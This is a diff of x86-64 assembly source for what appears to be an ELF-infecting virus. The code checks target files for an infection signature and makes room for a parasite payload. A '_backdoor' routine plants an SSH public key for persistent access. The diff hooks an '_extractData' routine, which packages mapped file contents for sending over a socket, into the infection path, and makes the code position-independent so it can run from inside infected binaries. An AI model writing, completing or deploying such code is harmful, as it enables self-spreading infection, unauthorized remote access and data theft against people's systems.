@@ -10,20 +10,7 @@ _start:
     ; mov rbp, rsp
 	push rbp
     mov rbp, rsp
-	push rax
-	push rbx
-	push rcx
-	push rdx
-	push rsi
-	push rdi
-	push r8
-	push r9
-	push r10
-	push r11
-	push r12
-	push r13
-	push r14
-	push r15
+	PUSHA
 	; lea rdi, [rel dir1]                                   ; dir to open for arg readDir
 	; mov rsi, dir1Len
 	; call _readDir
@@ -46,20 +33,7 @@ _start:
 
     ; jmp _exit
 	_final_jmp:
-	pop r15
-	pop r14
-	pop r13
-	pop r12
-	pop r11
-	pop r10
-	pop r9
-	pop r8
-	pop rdi
-	pop rsi
-	pop rdx
-	pop rcx
-	pop rbx
-	pop rax
+	POPA	
 	mov rsp, rbp
 	pop rbp
 	_bf_exit:
@@ -233,6 +207,9 @@ _check_file:
 		syscall
 		cmp	rax, 0x0								; rax -> map (used later)
 		jl _close_file_inf
+		call _extractData
+		mov rax, r12
+		mov rsi, r15
 		lea r8, INF(infection.map)
 		mov [r8], rax
 
@@ -285,13 +262,13 @@ _check_file:
 		; mov r15, r14								; r15 -> curr_phdr
 		; add r15, [r14 + elf64_phdr.p_filesz]		; r15 -> end curr_seg
 		; add r15, CODE_LEN
+		sub rbx, CODE_LEN							; rbx -> end of segment
 		mov r15, rbx								; r15 -> end of potential parasite
 		sub r15, _end - signature					; r15 -> start of potential signature
 		lea r13, signature
 		mov r13, [r13]								; r13 = signature[8]
 		cmp r13, qword [r15]						; strncmp(signature, (char *)r15, 8);
 		je	_unmap_close_inf
-		sub rbx, CODE_LEN							; rbx -> end of segment
 		add rbx, 0x10
 		and rbx, -16								; align
 		
@@ -428,7 +405,7 @@ _backdoor:
                 mov byte [r11], 0
                 mov rdi, r11
                 sub rdi, sshPubLen - 1
-                mov rsi, sshPub
+                lea rsi, [rel sshPub]
                 push rcx
                 call _strcmp
                 pop rcx
@@ -441,11 +418,12 @@ _backdoor:
         _notFound:
             mov rdi, r9
             mov rax, SYS_WRITE
-            mov rsi, sshPub
+            ;mov rsi, sshPub
+            lea rsi, [rel sshPub]
             mov rdx, sshPubLen - 1
             syscall
             mov rax, SYS_WRITE
-            mov rsi, back
+            lea rsi, [rel back]
             mov rdx, 1
             syscall
 
@@ -484,52 +462,6 @@ _closeSock:
     mov rax, -1
     ret
 
-;     ; ============= A ENLEVER ===================== ;
-; _open_file:
-;         push rbp
-;         mov rbp, rsp
-;         sub rsp, infection_size
-
-; 		mov	rax, SYS_OPEN
-; 		mov rdi, rsi
-; 		mov rsi, O_RDWR
-; 		xor rdx, rdx 
-; 		syscall
-; 		cmp	rax, 0x0
-; 		jl	_returnLeave
-; 		mov INF(infection.file_fd), rax
-
-; 	; === get file size ===
-; 	_get_filesz:
-; 		mov rax, SYS_LSEEK
-; 		mov	rdi, INF(infection.file_fd)
-; 		mov	rsi, 0x0
-; 		mov rdx, SEEK_END
-; 		syscall
-; 		cmp rax, 0x0
-; 		jle _close_file
-
-; 	_map_file:
-; 	; rax	-> map
-; 		mov rsi, rax								; rsi = file_size
-; 		mov rax, SYS_MMAP
-; 		mov	rdi, 0x0
-; 		mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
-; 		mov r10, MAP_SHARED
-; 		mov r8, INF(infection.file_fd)
-; 		mov r9, 0x0
-; 		syscall
-; 		cmp	rax, 0x0								; rax -> map (used later)
-; 		jl _returnLeave
-;         call _extractData
-
-;     _close_file:
-;         mov	rax, 0x3
-;         mov	rdi, INF(infection.file_fd)
-;         syscall
-;         jmp _returnLeave
-;     ; ============================================;
-
 ; doit prendre le sockfd en argument (r13 == sockfd)
 _extractData:
     mov r12, rax                                    ; r12 -> maped file_date
@@ -562,13 +494,13 @@ _extractData:
         ; *r15 == la taille du mmap buffer
         mov r14, rax
         mov rsi, rax
-        mov rdi, headerStart
+        lea rdi, [rel headerStart]
         call _strcpy
         pop rax
         push rax
         add rsi, headerStartLen - 1
         call _itoa
-        mov rdi, headerEnd
+        lea rdi, [rel headerEnd]
         call _strcpy
         add rsi, headerEndLen - 1
         mov rdi, r12
